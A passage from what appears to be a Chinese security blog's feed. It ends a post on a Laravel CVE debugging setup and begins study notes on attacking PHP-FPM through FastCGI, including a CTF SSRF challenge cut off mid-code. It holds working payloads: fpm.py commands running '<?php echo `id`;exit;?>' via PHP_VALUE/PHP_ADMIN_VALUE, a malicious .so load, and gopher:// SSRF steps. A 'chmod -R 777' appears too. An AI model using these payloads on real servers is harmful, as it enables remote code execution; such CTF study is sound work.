&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>vim composer.json &lt;span style="color:#75715e"># 修改内容见下&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>composer update
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mv public html
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chmod -R &lt;span style="color:#ae81ff">777&lt;/span> /var/www
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">&amp;#34;laravel/framework&amp;#34;: &amp;#34;8.22.1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">&amp;#34;facade/ignition&amp;#34;: &amp;#34;2.5.1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>一个坑点：即使指定了&lt;a href="laravel/laravel">laravel/laravel&lt;/a>版本，composer创建默认会使用最新的&lt;a href="laravel/framework">laravel/framework&lt;/a>版本&amp;amp;相关组件依赖（比如现在是8.73.2），由于我们需要复现的cve有特殊的laravel组件版本需求，，所以我们需要单独对composer.json进行修改，然后执行&lt;code>composer update&lt;/code>进行更新&lt;/p>
&lt;p>一切顺利的话访问web页面就可以看到laravel啦&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125165355843.png" alt="image-20211125165355843">&lt;/p>
&lt;h2 id="与本地的phpstorm连接起来进行debug">与本地的PHPStorm连接起来进行debug&lt;/h2>
&lt;p>开始之前先自问自答一下：为什么调试要一个能映射到公网的端口？&lt;/p>
&lt;p>PHPStorm中集成了遵循DBGp协议的Xdebug插件，当开启监听时会监听本地指定端口，当访问指定server的web页面并带有含有ide_key的特定cookie参数之后，Xdebug会接收到这个参数并开启debug，通过DBGp协议向php.ini中指定的ip&amp;amp;port发送请求，当这个port指向我们ide在监听的端口时，就会建立起Xdebug和ide的连接（使用DBGp协议通讯），随后它们之间进行数据交互，如此反复；更详细的内容请参见-&amp;gt;&lt;a href="https://xdebug.org/docs/dbgp#id32">6.3 IDE to debugger engine communications&lt;/a>&lt;/p>
&lt;p>这下就好理解了叭？也就是说，需要一个与远程代码运行环境处在同一个网段下的端口（公网的更好）；接下来就是配置啦&lt;/p>
&lt;h3 id="内网穿透">内网穿透&lt;/h3>
&lt;p>内网穿透我使用的是nps，配置过程可以参考&lt;a href="https://ehang-io.github.io/nps/#/run">官方文档&lt;/a>，由于我这里配的比较早 这部分跳过&lt;/p>
&lt;h3 id="phpstorm的设置有一堆">PHPStorm的设置有一堆&lt;/h3>
&lt;p>把docker中/www目录打包拖下来，用PHPStorm打开&lt;/p>
&lt;h4 id="设置debug">设置Debug&lt;/h4>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125172830540.png" alt="image-20211125172830540">&lt;/p>
&lt;p>20007是本地端口，被映射到公网ip&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125172903465.png" alt="image-20211125172903465">&lt;/p>
&lt;p>这里的20007是公网端口，代理本地的20007&lt;/p>
&lt;p>如果我讲清楚前面原理的话，大家应该能理解这两个地方的端口设置二选一即可&lt;/p>
&lt;h4 id="设置deployment">设置Deployment&lt;/h4>
&lt;p>用SFTP与docker进行ssh连接，文件映射&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125174439189.png" alt="image-20211125174439189">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125174449223.png" alt="image-20211125174449223">&lt;/p>
&lt;h4 id="设置远程php解释器">设置远程php解释器&lt;/h4>
&lt;p>选择ssh模式，配一下账号密码端口就行（至于为什么不用docker/docker-compose，之后会说），这里的Path mappings直接就是Deployment中配好的，可以单独再加，但是没必要&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125173731219.png" alt="image-20211125173731219">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125174004041.png" alt="image-20211125174004041">&lt;/p>
&lt;h4 id="设置server">设置Server&lt;/h4>
&lt;p>注意高亮地方的设置，是web页面的端口，也要设置好本地的路径映射&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125173454167.png" alt="image-20211125173454167">&lt;/p>
&lt;h3 id="验证一下联通情况">验证一下联通情况&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125175835232.png" alt="image-20211125175835232">&lt;/p>
&lt;p>好耶~&lt;/p>
&lt;h3 id="浏览器插件xdebug-helper">浏览器插件Xdebug helper&lt;/h3>
&lt;p>设置Debug Configuration，选PHP Remote Debug模式&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125175154353.png" alt="image-20211125175154353">&lt;/p>
&lt;p>安装插件，设置ide_key，开启小虫子&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125180035074.png" alt="image-20211125180035074">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125180424620.png" alt="image-20211125180424620">&lt;/p>
&lt;h2 id="终于完了">终于完了&lt;/h2>
&lt;p>随便打个断点，开启本地监听&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125180223037.png" alt="image-20211125180223037">&lt;/p>
&lt;p>刷新页面&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125180453865.png" alt="image-20211125180453865">&lt;/p>
&lt;p>芜湖起飞！&lt;/p>
&lt;h2 id="待完善的地方">***待完善的地方&lt;/h2>
&lt;ul>
&lt;li>配置远程php解释器可以使用docker/docker-compose，这两个都需要单独挂载关键目录出来，配置上与ssh的区别还是有点大的，也需要注意docker-compose文件的编写，先扔一个参考资料-&amp;gt;&lt;a href="https://www.pascallandau.com/blog/setup-phpstorm-with-xdebug-on-docker/#setup-the-docker-containers">Setting up PhpStorm with Xdebug for local development on Docker &amp;hellip; natively and via Deployment Configuration.&lt;/a>&lt;/li>
&lt;li>关于dockerfile/docker-compose文件的编写，我还不是很熟练，跟不用说这样的php项目了，同样先扔一个参考资料-&amp;gt;&lt;a href="https://www.pascallandau.com/blog/structuring-the-docker-setup-for-php-projects/">Structuring the Docker setup for PHP Projects &amp;hellip; folder structure, Dockerfile templates and general fundamentals&lt;/a>&lt;/li>
&lt;li>PHPStorm有内置的docker管理功能，可以创建镜像-&amp;gt;配置debug一步到位&lt;/li>
&lt;/ul>
&lt;hr>
&lt;p>虽然踩了很多坑，但是也学到了不少东西，希望能多少帮助一些人少走弯路（&lt;/p>
&lt;p>限于篇幅原因，代码审计的部分就放到后面啦~&lt;/p>
&lt;p>最近更新的不太勤快，我先自我批评TAT，已经很菜了不能再不努力啊啊啊啊啊啊啊啊&lt;/p></description></item><item><title>攻击PHP-FPM学习笔记</title><link>https://amiaaaz.github.io/2021/11/18/attack-php-fpm-study-notes/</link><pubDate>Thu, 18 Nov 2021 00:03:25 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/18/attack-php-fpm-study-notes/</guid><description>&lt;p>之前做题总是会见到，但并不是很懂实际的原理，有点云里雾里的，好像懂了但又没有完全懂，是时候专门来学一下咯！&lt;/p>
&lt;p>没有什么新鲜的东西，只不过把师傅们已有的文章进行一个整合&amp;amp;重新整理，参考链接放到最后啦w&lt;/p>
&lt;h2 id="前置知识">前置知识&lt;/h2>
&lt;h3 id="cgifastcgi">CGI/FastCGI&lt;/h3>
&lt;p>CGI协议用于处理html这类静态文件之后出现的动态语言的解释器与webserver通信的问题，具体的实现有php-cgi&lt;/p>
&lt;p>CGI的弊端是令webserver每次处理请求时都会fork一个cgi进程，结束后再kill，比较浪费资源，FastCGI协议就解决了这个问题，处理完请求后不会kill而是保留该进程，使它可以一次处理多个请求，这样就不用每次fork了&lt;/p>
&lt;p>而php-fpm就是FastCGI协议的一个具体实现，作为FastCGI进程管理器（运行时有一个主进程和多个包含php解释器的worker进程来执行代码），用于接收webserver的请求&lt;/p>
&lt;p>查看phpinfo，Sever API处一般会有三种样式：&lt;/p>
&lt;ul>
&lt;li>Apache 2.0 Handler&lt;/li>
&lt;li>CGI/FastCGI&lt;/li>
&lt;li>FPM/FastCGI&lt;/li>
&lt;/ul>
&lt;p>第一种把php作为apache的一个模块，相当于apache中的一个.dll或.so；第二种php-cgi.exe是一个独立的进程，web服务器也是独立的apache.exe，web服务器监听到http请求时会去调用php-cgi进程，之间通过cgi协议传递数据；而第三种fastcgi也是一种协议，它做了很多优化且常驻内存 不用每次都调用一下cgi，有辅助功能比如内存管理，垃圾处理由php-fpm来实现&lt;/p>
&lt;h3 id="配置">配置&lt;/h3>
&lt;p>php-fpm通信方式有tcp（本地监听9000端口）和unix socket套接字两种方式，题目中可以见到的都是tcp9000&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>apt update
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apt install nginx -y
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apt install software-properties-common -y
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apt install php7.4-fpm -y
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="tcp模式">tcp模式&lt;/h4>
&lt;p>/etc/php/7.4/fpm/pool.d/www.conf&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">listen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">127.0.0.1:9000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>/etc/nginx/sites-enabled/default&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">location ~ \.php$ {&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">include snippets/fastcgi-php.conf;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fastcgi_pass 127.0.0.1:9000;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="unix-socket模式">unix socket模式&lt;/h4>
&lt;p>如果启动fpm不做改动，默认为套接字模式&lt;/p>
&lt;p>/etc/php/7.4/fpm/pool.d/www.conf&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">listen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">/run/php/php7.4-fpm.sock&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>/etc/nginx/sites-enabled/default&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">location ~ \.php$ {&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">include snippets/fastcgi-php.conf;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fastcgi_pass unix:/run/php/php7.4-fpm.sock;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后重启即可&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>service nginx start &lt;span style="color:#75715e"># reload&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/etc/init.d/php7.4-fpm start &lt;span style="color:#75715e"># restart&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果出现报错请查看对应日志&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>cat /var/log/nginx/error.log
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat /var/log/php7.4-fpm.log
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="漏洞成因">漏洞成因&lt;/h2>
&lt;p>按FastCGI协议传输的内容分为header和body两部分&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">typedef&lt;/span> &lt;span style="color:#00a8c8">struct&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* Header */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">version&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// 版本
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// 本次record的类型
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">requestIdB1&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// 本次record对应的请求id
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">requestIdB0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">contentLengthB1&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// body体的大小
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">contentLengthB0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">paddingLength&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// 额外块大小
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">reserved&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* Body */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">contentData&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">contentLength&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">paddingData&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">paddingLength&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#111">FCGI_Record&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>先从heder中拿到body体大小（最大2^16=65535字节），再从tcp流里读取大小等于contentLenth的body，之后还有一部分额外的padding&lt;/p>
&lt;p>header中的type起到指定record的作用，因为FastCGI的单个record大小有限作用单一，所以我们需要一个TCP流中传输多个record，通过type来标识每个record的作用是什么，requestId做到区分每一次的请求&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112110643128.png" alt="image-20211112110643128">&lt;/p>
&lt;p>当type=4时，表明消息中包含的数据为某个name-value对，比如&lt;/p>
&lt;pre tabindex="0">&lt;code>{
&amp;#39;GATEWAY_INTERFACE&amp;#39;: &amp;#39;FastCGI/1.0&amp;#39;,
&amp;#39;REQUEST_METHOD&amp;#39;: &amp;#39;GET&amp;#39;,
&amp;#39;SCRIPT_FILENAME&amp;#39;: &amp;#39;/var/www/html/index.php&amp;#39;,
&amp;#39;SCRIPT_NAME&amp;#39;: &amp;#39;/index.php&amp;#39;,
&amp;#39;QUERY_STRING&amp;#39;: &amp;#39;?a=1&amp;amp;b=2&amp;#39;,
&amp;#39;REQUEST_URI&amp;#39;: &amp;#39;/index.php?a=1&amp;amp;b=2&amp;#39;,
&amp;#39;DOCUMENT_ROOT&amp;#39;: &amp;#39;/var/www/html&amp;#39;,
&amp;#39;SERVER_SOFTWARE&amp;#39;: &amp;#39;php/fcgiclient&amp;#39;,
&amp;#39;REMOTE_ADDR&amp;#39;: &amp;#39;127.0.0.1&amp;#39;,
&amp;#39;REMOTE_PORT&amp;#39;: &amp;#39;12345&amp;#39;,
&amp;#39;SERVER_ADDR&amp;#39;: &amp;#39;127.0.0.1&amp;#39;,
&amp;#39;SERVER_PORT&amp;#39;: &amp;#39;80&amp;#39;,
&amp;#39;SERVER_NAME&amp;#39;: &amp;#34;localhost&amp;#34;,
&amp;#39;SERVER_PROTOCOL&amp;#39;: &amp;#39;HTTP/1.1&amp;#39;
}
&lt;/code>&lt;/pre>&lt;p>其中&lt;code>SCRIPT_FILENAME&lt;/code>就是php-fpm会去执行的文件，由于5.3.9版本引入了&lt;code>security.limit_extensions&lt;/code>的选项，默认对后缀名限制在了php家族，所以我们可以考虑找到已存在php文件（安装时附带的php文件 可以通过&lt;code>find / -name &amp;quot;*.php&amp;quot;&lt;/code>来搜索一下默认环境 比如/usr/local/lib/php/PEAR.php），向其中注入恶意代码；而fpm支持通过设置&lt;code>FASTCGI_PARAMS&lt;/code>来动态修改php的设置，可以利用这两项&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;#39;PHP_VALUE&amp;#39;: &amp;#39;auto_prepend_file = php://input&amp;#39;,
&amp;#39;PHP_ADMIN_VALUE&amp;#39;: &amp;#39;allow_url_include = On&amp;#39;
&lt;/code>&lt;/pre>&lt;p>来做到执行某php文件时自动包含POST内容，执行恶意代码（disable_function在php加载时就确定好了，无法重写）&lt;/p>
&lt;h2 id="攻击思路例题">攻击思路&amp;amp;&amp;amp;例题&lt;/h2>
&lt;p>伪造一个可以正常通信的FastCGI客户端，将传输的内容修改为我们的恶意payload，再发出去&lt;/p>
&lt;h3 id="远程攻击php-fpm">远程攻击php-fpm&lt;/h3>
&lt;p>这里是&lt;a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">p牛的脚本&lt;/a>，兼容py2&amp;amp;3，默认-p 9000，-c &lt;code>&amp;lt;?php phpinfo();?&amp;gt;&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>python fpm.py target_ip /var/www/html/index.php -c &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php echo `id`;exit;?&amp;gt;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们需要改动的只有params部分的&lt;code>PHP_ADMIN_VALUE&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;#39;PHP_ADMIN_VALUE&amp;#39;: &amp;#39;allow_url_include = On\nextension = /home/amelia/TEMP/fpm/wuhu.so&amp;#39;,
&lt;/code>&lt;/pre>&lt;p>成功&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112175028236.png" alt="image-20211112175028236">&lt;/p>
&lt;p>需要注意的是，如果只是加载恶意.so而不执行代码，则并不需要有已存在php文件的绝对路径，用&lt;code>_&lt;/code>占位即可&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>python fpm.py target_ip _ -c &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php echo `id`;exit;?&amp;gt;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112175353957.png" alt="image-20211112175353957">&lt;/p>
&lt;h3 id="ssrf攻击本地php-fpm">SSRF攻击本地php-fpm&lt;/h3>
&lt;p>利用&lt;code>gopher://&lt;/code>协议可以直接传输TCP协议流，我们构造好payload之后就可以传入进行ssrf攻击了&lt;/p>
&lt;p>构造payload依旧使用p牛的脚本，不过做一点微小的改动；这部分可以参见后面结合ftp攻击fpm的内容，总之就照这几步走&lt;/p>
&lt;ul>
&lt;li>p牛脚本生成urlencode之后的tcp数据流&lt;/li>
&lt;li>加gopher://127.0.0.1:9000前缀&lt;/li>
&lt;li>梭！?url=gopher://127.0.0.1:9000/_xxxxxxxxxxxxxxxx&lt;/li>
&lt;/ul>
&lt;h4 id="强网青少-2021ssrf">[强网青少 2021]SSRF&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//like fpm?
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Crawl&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">===&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://&amp;#34;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://127.0.0.1/&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">curl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$ch&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_init&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_URL&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">);&lt;/span>
